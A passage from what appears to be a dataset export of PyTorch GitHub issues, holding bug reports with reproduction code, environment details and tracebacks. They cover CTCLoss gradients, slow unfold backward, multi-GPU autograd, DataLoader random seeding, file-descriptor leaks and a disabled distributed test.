1. Download [`memtestcase.py`](https://gist.githubusercontent.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6/raw/886b74c3529dbdb3af6f072ebc623abe1c852a6b/memtestcase.py) and [`run.sh`](https://gist.githubusercontent.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6/raw/886b74c3529dbdb3af6f072ebc623abe1c852a6b/run.sh)
2. Run `run.sh`. Observe which test cases pass.

Logs from several environments on the fair cluster:
1. pytorch 1.0.0 (@klshuster's env) (pytorch 1.0.0, cuda 9.0.176): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-kurtlog-pytorch-1-0-0-cuda-9-0-176
2. fairseqenv (@myleott's) (pytorch 1.0.0.dev20190211, cuda 10.0.130): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-fairseqenv-pytorch-1-0-0-dev20190211-cuda-10-0-130
3. pytorch stable env (@stephenroller's): https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6#file-stable-env-pytorch-1-0-1-post2-cuda-10-0-130

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

All test cases pass. At the very least, test cases should produce consistent results across all `--mode`s.

## Environment

Here's the environment from the third log (@stephenroller's) (pytorch 1.0.1.post2, cuda 10.0.130):

```
Collecting environment information...
PyTorch version: 1.0.1.post2
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 410.79
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.16.2
[pip] pytorch-pretrained-bert==0.6.1
[pip] torch==1.0.1.post2
[pip] torchtext==0.3.1
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl_fft                   1.0.10           py37ha843d7b_0
[conda] mkl_random                1.0.2            py37hd81dba3_0
[conda] pytorch                   1.0.1           py3.7_cuda10.0.130_cudnn7.4.2_2    pytorch
[conda] pytorch-pretrained-bert   0.6.1                     <pip>
[conda] torchtext                 0.3.1                     <pip>
```


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @aazzolini @xush6528 @osalpekar",True
CTCLoss with empty target doesn't work well module: bootcamp module: nn triaged module: derivatives,"## üêõ Bug

CTCLoss doesn't provide the correct gradient when the target sequence is empty.

## To Reproduce

```
import torch

probs = torch.randn(2, 2, 3, dtype=torch.double).log_softmax(-1).requires_grad_()
labels = torch.tensor([1, 2])
label_sizes = [2, 0]
sizes = [2, 2]
loss = torch.nn.functional.ctc_loss(probs, labels, sizes, label_sizes, reduction='sum', zero_infinity=True)
loss2 = torch.nn.functional.ctc_loss(probs, labels, sizes, label_sizes, reduction='none', zero_infinity=True)
grad, = torch.autograd.grad(loss, probs)

probs_gpu = probs.detach().cuda().requires_grad_()
loss_gpu = torch.nn.functional.ctc_loss(probs_gpu, labels.cuda(), sizes, label_sizes, reduction='sum', zero_infinity=True)
loss2_gpu = torch.nn.functional.ctc_loss(probs_gpu, labels.cuda(), sizes, label_sizes, reduction='none', zero_infinity=True)
grad_gpu, = torch.autograd.grad(loss_gpu, probs_gpu)

print('loss:', loss, loss_gpu)
print('loss2:', loss2, loss2_gpu)
print('grad:', grad, ""\n"", grad_gpu)

print(""grad_check cpu: "",
      torch.autograd.gradcheck(lambda logits: torch.nn.functional.ctc_loss(logits.log_softmax(-1), labels, sizes, label_sizes, reduction='sum', zero_infinity=True), (torch.randn(2, 2, 3, dtype=torch.double, requires_grad=True),), raise_exception=False))
print(""grad_check gpu: "",
      torch.autograd.gradcheck(lambda logits: torch.nn.functional.ctc_loss(logits.log_softmax(-1), labels.cuda(), sizes, label_sizes, reduction='sum', zero_infinity=True), (torch.randn(2, 2, 3, dtype=torch.double, device='cuda', requires_grad=True),), raise_exception=False))
```
also the default reduction doesn't play well with zero length.

## Expected behavior

Compute the proper loss and gradient (which would point in the direction of less ""blank"").

## Acknowledgement

This has been pointed out by Evgeni Kirov, thank you for tracking this down!
",True
Tensor unfold backward is slow high priority module: performance module: autograd triaged module: derivatives,"## üêõ Bug

Given the following code, the forward pass is very fast but the backward pass is unreasonably slow. I had a look at the backward pass code and while I am not an expert, I think it could be made significantly faster by writing a custom kernel instead of allocating index arrays, especially since `index_add_` seems to be so slow.

```python
import torch
import time

layer = torch.nn.Conv2d(3, 1, 3)
inp = torch.rand(10, 3, 1000, 1000)

out = layer(inp)
c = 5

res = out.unfold(3, c, 1)
res.sum().backward()

```

```
--------------------------------------------------------------------------------
  Environment Summary
--------------------------------------------------------------------------------
PyTorch 1.0.0.dev20181221 not compiled w/ CUDA
Running with Python 3.6 and

`pip list` truncated output:
Unable to fetch
--------------------------------------------------------------------------------
  cProfile output
--------------------------------------------------------------------------------
         1983 function calls (1400 primitive calls) in 8.831 seconds

   Ordered by: internal time
   List reduced from 79 to 15 due to restriction <15>

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    8.216    8.216    8.216    8.216 {method 'run_backward' of 'torch._C._EngineBase' objects}
        1    0.315    0.315    0.315    0.315 {built-in method conv2d}
        1    0.218    0.218    0.218    0.218 {built-in method rand}
        1    0.078    0.078    0.078    0.078 {method 'sum' of 'torch._C._TensorBase' objects}
    102/1    0.001    0.000    0.002    0.002 /anaconda3/lib/python3.6/abc.py:196(__subclasscheck__)
        1    0.000    0.000    0.001    0.001 /anaconda3/lib/python3.6/site-packages/torch/nn/modules/conv.py:17(__init__)
        2    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/site-packages/torch/nn/init.py:178(_calculate_fan_in_and_fan_out)
    98/30    0.000    0.000    0.001    0.000 /anaconda3/lib/python3.6/typing.py:1145(__subclasscheck__)
      202    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/_weakrefset.py:70(__contains__)
        1    0.000    0.000    8.831    8.831 minimal.py:1(<module>)
        1    0.000    0.000    0.000    0.000 {method 'unfold' of 'torch._C._TensorBase' objects}
       85    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/_weakrefset.py:58(__iter__)
    196/5    0.000    0.000    0.002    0.000 {built-in method builtins.issubclass}
       70    0.000    0.000    0.000    0.000 {method '__subclasses__' of 'type' objects}
       21    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/site-packages/torch/nn/modules/module.py:537(__setattr__)


--------------------------------------------------------------------------------
  autograd profiler output (CPU mode)
--------------------------------------------------------------------------------
        top 15 events sorted by cpu_time_total

---------------------------------------  ---------------  ---------------  ---------------  ---------------  ---------------
Name                                            CPU time        CUDA time            Calls        CPU total       CUDA total
---------------------------------------  ---------------  ---------------  ---------------  ---------------  ---------------
UnfoldBackward                             7823869.000us          0.000us                1    7823869.000us          0.000us
index_add_                                 7222056.000us          0.000us                1    7222056.000us          0.000us
contiguous                                  370504.000us          0.000us                1     370504.000us          0.000us
clone                                       370501.000us          0.000us                1     370501.000us          0.000us
MkldnnConvolutionBackward                   257265.000us          0.000us                1     257265.000us          0.000us
mkldnn_convolution_backward                 257256.000us          0.000us                1     257256.000us          0.000us
mkldnn_convolution_backward_weights         257251.000us          0.000us                1     257251.000us          0.000us
conv2d                                      249499.000us          0.000us                1     249499.000us          0.000us
convolution                                 249495.000us          0.000us                1     249495.000us          0.000us
_convolution                                249494.000us          0.000us                1     249494.000us          0.000us
mkldnn_convolution                          249477.000us          0.000us                1     249477.000us          0.000us
contiguous                                  170065.000us          0.000us                1     170065.000us          0.000us
clone                                       170061.000us          0.000us                1     170061.000us          0.000us
sum                                          71872.000us          0.000us                1      71872.000us          0.000us
_th_arange                                   19876.000us          0.000us                1      19876.000us          0.000us
```

## To Reproduce

See code above

## Expected behavior

It should be faster

## Environment
Collecting environment information...
PyTorch version: 1.0.0.dev20181221
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.13.6
GCC version: Could not collect
CMake version: version 3.13.0

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] Could not collect
[conda] blas                      1.0                         mkl
[conda] mkl                       2018.0.3                      1
[conda] mkl-service               1.1.2            py37h6b9c3cc_5
[conda] mkl_fft                   1.0.6            py36hb8a8100_0
[conda] mkl_random                1.0.1            py36h5d10147_1
[conda] pytorch                   1.0.0                   py3.6_1    pytorch
[conda] pytorch-nightly           1.0.0.dev20181221         py3.6_0    pytorch
[conda] torchaudio                0.2                       <pip>
[conda] torchtext                 0.3.1                     <pip>
[conda] torchvision               0.2.1                      py_2    pytorch
## Additional context

My real application needs `c=200` but it takes more than 10 minutes to run (i stopped at that point). Let me know if the same operation can be done more efficiently with some other method.


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @VitalyFedyunin @ngimel",True
Missing gradient when autograd called inside a function on Multi-GPU (eg gradient penalty) high priority module: autograd triaged,"## üêõ Bug

Gradient is missing when calling torch.autograd.grad wrapped inside a function on multiple GPU's. (eg computing wgan gradient penalty). Calling torch.autograd.grad inline (not wrapped in a function) on multiple GPU's returns expected behavior.


## To Reproduce

Code below:
```python
import torch
import torch.nn as nn

torch.cuda.manual_seed_all(0)
torch.manual_seed(0)


def gradient_penalty(netD, x):
    """"""Functional Gradient Calculation""""""
    output = netD(x)
    gradients = torch.autograd.grad(outputs=output, inputs=x,
                                    grad_outputs=x.new_ones(output.size()),
                                    create_graph=True, retain_graph=True)[0].mean()
    return gradients


net = nn.Linear(4, 1).cuda()
multigpu_net = nn.DataParallel(net, [0, 1])

x = torch.ones(2, 4, requires_grad=True).cuda()

print(""Single GPU Functional"")
net.zero_grad()
loss = gradient_penalty(net, x)
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])


print(""\nMulti-GPU Functional"")
multigpu_net.zero_grad()
loss = gradient_penalty(multigpu_net, x)
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])

print(""\nMulti-GPU Inline"")
multigpu_net.zero_grad()
output = multigpu_net(x)

# Compute grad inline
loss = torch.autograd.grad(outputs=output, inputs=x,
                            grad_outputs=x.new_ones(output.size()),
                            create_graph=True, retain_graph=True)[0].mean()
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])
```

<br>

Output for a single GPU calling `gradient_penalty` function
```
Single GPU Functional
Loss: -0.1287534236907959
Grad: [tensor([[0.2500, 0.2500, 0.2500, 0.2500]], device='cuda:0')]
```

<br>

MultiGPU calling `gradient_penalty` function
```
Multi-GPU Functional
Loss: -0.1287534236907959
Grad: [tensor([[0., 0., 0., 0.]], device='cuda:0')]
```

<br>

Multi-GPU calling `autograd.grad` inline (not inside a function)
```
Multi-GPU Inline
Loss: -0.1287534236907959
Grad: [tensor([[0.2500, 0.2500, 0.2500, 0.2500]], device='cuda:0'), tensor([0.], device='cuda:0')]
```

<br>

## Expected behavior

The gradient should be accumulated when calling `autograd.grad` from inside another function. All outputs gradients from the script should be the same.

## Environment

 - PyTorch Version (e.g., 1.0): 1.0.9
 - OS (e.g., Linux): Ubuntu 16.04.3 LTS
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6
 - CUDA/cuDNN version: 9.0/6
 - GPU models and configuration:
GPU 0: GeForce GTX 1080
GPU 1: GeForce GTX 1080
GPU 2: GeForce GTX 1080
GPU 3: GeForce GTX 1080


",True
implement dirichlet / beta GPU grad  module: distributions triaged,"## Issue description
`torch.distributions.Beta` and `torch.distributions.Dirichlet` don't allow for backward() calls on the GPU; the CPU versions works fine though. 

```ipython
In [1]: import torch

In [2]: d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requir
   ...: es_grad=True))).rsample()

In [3]: torch.mean(d).backward()

In [4]: d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requir
   ...: es_grad=True).cuda())).rsample()


In [5]: 

In [5]: torch.mean(d).backward()
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-5-d517ed89bac2> in <module>()
----> 1 torch.mean(d).backward()

~/.venv3/lib/python3.6/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
     94                 products. Defaults to ``False``.
     95         """"""
---> 96         torch.autograd.backward(self, gradient, retain_graph, create_graph)
     97 
     98     def register_hook(self, hook):

~/.venv3/lib/python3.6/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     88     Variable._execution_engine.run_backward(
     89         tensors, grad_tensors, retain_graph, create_graph,
---> 90         allow_unreachable=True)  # allow_unreachable flag
     91 
     92 

~/.venv3/lib/python3.6/site-packages/torch/autograd/function.py in apply(self, *args)
     74 
     75     def apply(self, *args):
---> 76         return self._forward_cls.backward(self, *args)
     77 
     78 

~/.venv3/lib/python3.6/site-packages/torch/autograd/function.py in wrapper(ctx, *args)
    186     def wrapper(ctx, *args):
    187         with torch.no_grad():
--> 188             outputs = fn(ctx, *args)
    189 
    190         if not torch.is_grad_enabled():

~/.venv3/lib/python3.6/site-packages/torch/distributions/dirichlet.py in backward(ctx, grad_output)
     33     def backward(ctx, grad_output):
     34         x, concentration = ctx.saved_tensors
---> 35         return _Dirichlet_backward(x, concentration, grad_output)
     36 
     37 

~/.venv3/lib/python3.6/site-packages/torch/distributions/dirichlet.py in _Dirichlet_backward(x, concentration, grad_output)
     18 def _Dirichlet_backward(x, concentration, grad_output):
     19     total = concentration.sum(-1, True).expand_as(concentration)
---> 20     grad = torch._dirichlet_grad(x, concentration, total)
     21     return grad * (grad_output - (x * grad_output).sum(-1, True))
     22 

RuntimeError: _dirichlet_grad is not implemented for type torch.cuda.FloatTensor

```
Provide a short description.

## Code example

```python
import torch
d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requires_grad=True))).rsample()
torch.mean(d).backward() # works!
d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requires_grad=True).cuda())).rsample()
torch.mean(d).backward() # throws above exception
```

## System Info

(base) ‚ûú  /tmp python collect_env.py 
Collecting environment information...
PyTorch version: 0.5.0a0+ddc37d7
Is debug build: No
CUDA used to build PyTorch: 9.2.148

OS: Manjaro Linux
GCC version: (GCC) 8.2.0
CMake version: version 3.11.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.2.148
GPU models and configuration: GPU 0: GeForce GTX 1060
Nvidia driver version: 396.54
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] Could not collect
[conda] magma-cuda92              2.3.0                         1    pytorch
[conda] torch                     0.5.0a0+ddc37d7           <pip>
[conda] torchfile                 0.1.0                     <pip>
[conda] torchvision               0.2.1                     <pip>

- PyTorch or Caffe2: pytorch
- How you installed PyTorch (conda, pip, source): source 
- OS: arch
- Python version: 3.7",True
"accessing the attributes of grad_fn such as kernel_size, stride feature module: autograd triaged","
## Issue description
Are there any methods to get the conv module input params from the ‚Äògrad_fn‚Äô in the newest version of pytorch?

in pytorch 0.2, we can get convolution parameters, such as kernel_size, padding, and stride from grad_fn, this way is very useful to convert the trained model to caffe prototxt.
but, in pytorch 0.4, the ThnnConv2DBackward and CudnnConvolutionBackward  do not support this way.

for example,in pytorch version 0.2,

## Code example
modle = nn.Conv2d(in_channels=3 out_channels=32, kernel_size=3,stride=2, padding=1, dilation=1))
y = modle(x)

Then, we can get the input param‚Äôs values like kernel_size„ÄÅstride„ÄÅpadding value use y.grad_fn.kernel_sizeÔºåy.grad_fn.padding,‚Ä¶‚Ä¶

but now, in pytorch 0.4, it report that 
""AttributeError: 'CudnnConvolutionBackward' object has no attribute 'kernel_size'""

cc @ezyang @SsnL @albanD @zou3519 @gqchen",True
Argmax performance slower than numpy high priority module: performance module: cuda triaged,"## Issue description

torch.argmax on a cuda array is slower than transferring to CPU and then calling np.argmax

## Code example

https://gist.github.com/tbenst/de3f61ac9956778a2ca6d5db94b526ef

## System Info
PyTorch version: 0.4.0
Is debug build: No
CUDA used to build PyTorch: 8.0.61

OS: Ubuntu 16.04.4 LTS
GCC version: (GCC) 6.3.0
CMake version: version 3.5.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.0.176
GPU models and configuration: GPU 0: GeForce GTX 1070
Nvidia driver version: 384.130
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.5.1.10
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_static_v5.a
/usr/lib/x86_64-linux-gnu/libcudnn_static_v7.a

Versions of relevant libraries:
[pip3] numpy (1.14.2)
[pip3] numpydoc (0.7.0)
[pip3] torch (0.4.0)
[pip3] torchvision (0.2.0)
[conda] cuda80                    1.0                           0    soumith
[conda] cuda90                    1.0                  h6433d27_0    pytorch
[conda] pytorch                   0.4.0            py36hd73e86b_0  
[conda] torchvision               0.2.0            py36h17b6947_1    pytorch

",True
np.random generates the same random numbers for each data batch high priority module: dataloader triaged module: random,"For example, the following script 

```
from __future__ import print_function

import numpy as np
import random

# np.random.seed(0)

class Transform(object):
    def __init__(self):
        pass

    def __call__(self, item = None):
        return [np.random.randint(10000, 20000), random.randint(20000,30000)]

class RandomDataset(object):

    def __init__(self):
        pass

    def __getitem__(self, ind):
        item = [ind, np.random.randint(1, 10000), random.randint(10000, 20000), 0]
        tsfm =Transform()(item)
        return np.array(item + tsfm)
    def __len__(self):
        return 20


from torch.utils.data import DataLoader

ds = RandomDataset()
ds = DataLoader(ds, 10, shuffle=False, num_workers=4)

for batch in ds:
    print(batch)
```

gives 

```
#     0   2208  10983      0  15930  26264
#     1   2798  14403      0  17685  29545
#     2    528  16195      0  12927  28761
#     3   8541  13614      0  15240  24058
#     4   7144  14373      0  18374  28081
#     5   2329  17456      0  15192  26903
#     6    423  12168      0  18504  24193
#     7   9476  12027      0  19924  22325
#     8   3427  17570      0  12895  29773
#     9   6526  13327      0  15768  24566
#[torch.LongTensor of size 10x6]
#
#
#    10   2208  15203      0  15930  26024
#    11   2798  13264      0  17685  22011
#    12    528  11714      0  12927  24688
#    13   8541  11773      0  15240  29607
#    14   7144  14655      0  18374  24573
#    15   2329  12544      0  15192  27908
#    16    423  15892      0  18504  23111
#    17   9476  17389      0  19924  23799
#    18   3427  12458      0  12895  23201
#    19   6526  14935      0  15768  20789
#[torch.LongTensor of size 10x6]
```

The second and fifth columns are np.random generated random numbers in Dataset and Transform. However, they are always that the same for different batches. This will make random data augmentation actually ""not random"".

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @SsnL @VitalyFedyunin @ejguan @pbelevich",True
torch.std NaN gradient todo module: bc-breaking module: autograd triaged module: NaNs and Infs actionable,"`torch.std(x)` gives NaN gradients at `x=0`.

```py
import torch
from torch.autograd.variable import Variable
import torch.nn.functional as F

a = Variable(torch.FloatTensor(16,3,64,64).zero_(),requires_grad=True)

# b = a.std(dim=0).mean()  # NaN gradients
# b = (a - a.mean(dim=0,keepdim=True)).norm(p=2,dim=0).mean() / (15**0.5)  # 0 gradients

b.backward()

print(a.grad.data)
```

related #2421 #3264


cc @ezyang @SsnL @albanD @zou3519 @gqchen @gchanan",True
`copy.deepcopy` does not copy gradient buffers of `torch.autograd.Variable` instance high priority module: bc-breaking module: autograd triaged,"I ran into unexpected behaviour with `copy.deepcopy` applied to a `Variable`. The gradient buffer of the `Variable` is not copied.
```
a = torch.autograd.Variable(torch.ones(1))
a.grad = torch.autograd.Variable(torch.ones(1))
b = copy.deepcopy(a)
print(b.grad)
```
I think it would be a good idea to copy the gradient buffer during a deep copy. My use case is recording the gradient of a model's parameter space for optimization research. This would also be useful for debugging/development of complex models that involve atypical gradient operations.

This is handled here: https://github.com/pytorch/pytorch/blob/5760b036fb338eacd641418321f23aee51b1aee9/torch/autograd/variable.py#L89-L97

A solution would be to also copy the `grad` attribute of the current `Variable`, which would involve a recursion of the deep copy since the grad attribute is also a `Variable`.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @gqchen @pearu @nikitaved @soulitzer @SsnL",True
"file_descriptor sharing strategy may be leaking FDs, resulting in DataLoader causing `RuntimeError: received 0 items of ancdata` high priority module: crash module: dataloader triaged has workaround","**Editorial note:** If you are having this problem, try running `torch.multiprocessing.set_sharing_strategy('file_system')` right after your import of torch

----

I am using a `DataLoader` in my code with a custom `Dataset` class, and it worked fine during training for several epochs. However, when testing my model, after a bit less than 1k iterations, I'm getting the following error:

```
RuntimeError                              Traceback (most recent call last)
/home/jfsantos/src/pytorch_models/test_model.py in <module>()
     82
     83 print('Generating samples...')
---> 84 for k, batch in tqdm(enumerate(test_loader)):
     85     f = G_test.audio_paths[k]
     86     spec, phase = spectrogram_from_file(f, window=window, step=step)

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/tqdm/_tqdm.py in __iter__(self)
    831 """""", fp_write=getattr(self.fp, 'write', sys.stderr.write))
    832
--> 833             for obj in iterable:
    834                 yield obj
    835                 # Update and print the progressbar.

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/torch/utils/data/dataloader.py in __next__(self)
    166         while True:
    167             assert (not self.shutdown and self.batches_outstanding > 0)
--> 168             idx, batch = self.data_queue.get()
    169             self.batches_outstanding -= 1
    170             if idx != self.rcvd_idx:

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/queues.py in get(self)
    343             res = self._reader.recv_bytes()
    344         # unserialize the data after having released the lock
--> 345         return ForkingPickler.loads(res)
    346
    347     def put(self, obj):

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/torch/multiprocessing/reductions.py in rebuild_storage_fd(cls, df, size)
     68         fd = multiprocessing.reduction.rebuild_handle(df)
     69     else:
---> 70         fd = df.detach()
     71     try:
     72         storage = storage_from_cache(cls, fd_id(fd))

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/resource_sharer.py in detach(self)
     56             '''Get the fd.  This should only be called once.'''
     57             with _resource_sharer.get_connection(self._id) as conn:
---> 58                 return reduction.recv_handle(conn)
     59
     60

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/reduction.py in recv_handle(conn)
    179         '''Receive a handle over a local connection.'''
    180         with socket.fromfd(conn.fileno(), socket.AF_UNIX, socket.SOCK_STREAM) as s:
--> 181             return recvfds(s, 1)[0]
    182
    183     def DupFd(fd):

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/reduction.py in recvfds(sock, size)
    158             if len(ancdata) != 1:
    159                 raise RuntimeError('received %d items of ancdata' %
--> 160                                    len(ancdata))
    161             cmsg_level, cmsg_type, cmsg_data = ancdata[0]
    162             if (cmsg_level == socket.SOL_SOCKET and

RuntimeError: received 0 items of ancdata
```

However, if I just do `idxs = [k for k, batch in tqdm(enumerate(test_loader))]` I do **not** have this issue.

I do not have any idea on how to test it as my knowledge of how PyTorch does this is currently very limited, but I could help debug this given some instructions. Does anyone have any idea on where I could start?",True
Problem with backward hook function high priority module: docs module: autograd triaged,"Hi,

there is something strange in the `backward` step (or maybe something I don't understand). If I define a Module that takes 3 inputs, the `grad_input` has to be of size 3, right ? But this is not the case here (from the backward_hook point of view):

```import torch
from torch.autograd import Variable
import torch.nn as nn
import torch.nn.functional as F

def bh(m,go,gi):
    print(""Grad Input"")
    print(go)
    print(""Grad Output"")
    print(gi)

class M(nn.Module):
    def __init__(self):
        super(M,self).__init__()
        self.register_backward_hook(bh)


    def forward(self,x,y,z):
        return (x+y+z)

x=Variable(torch.randn(1,5),requires_grad=True)
y=Variable(torch.randn(1,5),requires_grad=True)
z=Variable(torch.randn(1,5),requires_grad=True)

criterion=nn.MSELoss()
mod=M()
out=mod(x,y,z)
loss=criterion(out,Variable(torch.randn(1,5)))
loss.backward()```

In that case, when I print grad_input throught the hook function, it is just composed of two elements... Could you tell me where am I wrong ? But `x.grad, y.grad and z.grad` seem correctly computed

cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True
DISABLED test_2d_fsdp_tp_ac_compile (__main__.TestDTensorCompileE2E) skipped,"Platforms: linux

Broken on multigpu

To reenable on your PR, put `Fixes #<this issue number>` in the PR body and add the `ciflow/periodic` tag to trigger multigpu

Probably caused by #113547 or something in its stack @wanchaol  do you mind providing a forward fix?  

First known bad: https://hud.pytorch.org/pytorch/pytorch/commit/93372455a73043332c16a71cb9dccdf3e0412a57
Last known good: https://hud.pytorch.org/pytorch/pytorch/commit/a1e3c501652101e8b37baac62216db7ca22c9923

Ex. https://github.com/pytorch/pytorch/actions/runs/6863856295/job/18665805628
```
_______________ TestDTensorCompileE2E.test_2d_fsdp_tp_ac_compile _______________
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 542, in wrapper
    self._join_processes(fn)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 761, in _join_processes
    self._check_return_codes(elapsed_time)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 811, in _check_return_codes
    raise RuntimeError(error)
RuntimeError: Process 2 exited with error code 10 and exception:
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 658, in run_test
    getattr(self, test_name)()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 544, in wrapper
    fn()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 2575, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/distributed/_tensor/common_dtensor.py"", line 193, in wrapper
    func(self, *args, **kwargs)  # type: ignore[misc]
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 174, in wrapper
    return func(*args, **kwargs)
  File ""/var/lib/jenkins/workspace/test/distributed/_tensor/test_dtensor_compile.py"", line 328, in test_2d_fsdp_tp_ac_compile
    compiled_output = compiled_2d(inp)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1510, in _wrapped_call_impl
    return self._call_impl(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1519, in _call_impl
    return forward_call(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 408, in _fn
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1510, in _wrapped_call_impl
    return self._call_impl(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/nn/modules/module.py"", line 1519, in _call_impl
    return forward_call(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/fully_sharded_data_parallel.py"", line 840, in forward
    args, kwargs = _pre_forward(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 412, in _pre_forward
    unshard_fn(state, handle)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 447, in _pre_forward_unshard
    _unshard(state, handle, state._unshard_stream, state._pre_unshard_stream)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_runtime_utils.py"", line 331, in _unshard
    handle.unshard()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1272, in unshard
    self._use_unsharded_flat_param(padded_unsharded_flat_param)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1404, in _use_unsharded_flat_param
    self._use_unsharded_views(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1847, in _use_unsharded_views
    views = self._get_unflat_views()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_flat_param.py"", line 1824, in _get_unflat_views_aligned
    _ext_post_unflatten_transform(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/fsdp/_fsdp_extensions.py"", line 113, in _ext_post_unflatten_transform
    return fsdp_extension.post_unflatten_transform(tensor, param_extension)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/tensor/parallel/fsdp.py"", line 334, in post_unflatten_transform
    result = _unflatten_tensor(tensor, param_extension)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 569, in catch_errors
    return callback(frame, cache_entry, hooks, frame_state)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 671, in _convert_frame
    result = inner_convert(frame, cache_entry, hooks, frame_state)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 377, in _convert_frame_assert
